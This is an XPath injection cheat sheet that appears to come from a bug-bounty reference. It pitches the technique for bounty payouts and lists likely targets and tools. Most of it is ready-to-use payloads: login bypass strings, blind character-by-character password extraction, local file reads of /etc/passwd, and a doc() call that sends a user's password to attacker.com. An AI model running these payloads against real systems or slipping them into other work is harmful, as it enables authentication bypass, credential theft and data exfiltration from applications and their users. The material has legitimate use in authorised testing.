---
id: "xpath-injection"
title: "XPath Injection Attacks"
type: "technique"
category: "web-application"
subcategory: "injection"
tags: ["xpath", "xml", "injection", "authentication-bypass", "data-extraction", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["xxe", "ldap-injection", "sqli-payloads"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# XPath Injection Attacks

## Why XPath Injection Pays
XPath queries against XML data stores can be injected just like SQL. Auth bypass and full data extraction. Rare = treated as novel = higher bounties. $1.5k–$15k.

## Authentication Bypass
```
# Original: //users/user[username='USER' and password='PASS']

' or '1'='1
' or '1'='1' or '1'='1
' or 1=1 or ''='
admin' or '1'='1
'] | //user/*[contains(,'') | a]='
' or string-length(name(/*[1]))>0 or ''='
```

## Data Extraction
```
# Extract via error or boolean
' or //user[1]/username='admin' or '1'='1
'] | //*[contains(name(),'pass')] | //a['

# Count nodes
' or count(//*)>0 or ''='
' or count(//user)=5 or ''='

# Extract node names
' or name(/*[1])='root' or ''='
' or name(/*/*[1])='users' or ''='

# Extract values positionally
' or //user[position()=1]/child::node()[position()=1]='admin' or ''='
```

## Blind XPath Extraction
```
# String length discovery
' or string-length(//user[1]/password)=8 or ''='

# Character-by-character extraction
' or substring(//user[1]/password,1,1)='a' or ''='
' or substring(//user[1]/password,2,1)='b' or ''='

# Binary search optimization
' or substring(//user[1]/password,1,1)>'m' or ''='  # Narrow range
```

## XPath 2.0 Specific (File Read / SSRF)
```
' or doc('http://attacker.com/steal?data='||//user[1]/password) or '1'='1
' or doc-available('file:///etc/passwd') or '1'='1
' or unparsed-text('file:///etc/passwd') or ''='
```

## Where to Find This
- XML-based authentication systems (legacy enterprise)
- SOAP web services with XML query backends
- XML databases (MarkLogic, BaseX, eXist-db)
- CMS storing data in XML files
- Financial/healthcare apps with XML data stores
- Configuration management interfaces

## Tools
- xcat (blind XPath extraction tool)
- Burp Suite with XPath payloads
- xmlstarlet for crafting queries
- Custom Python with lxml
- nuclei xpath-injection templates
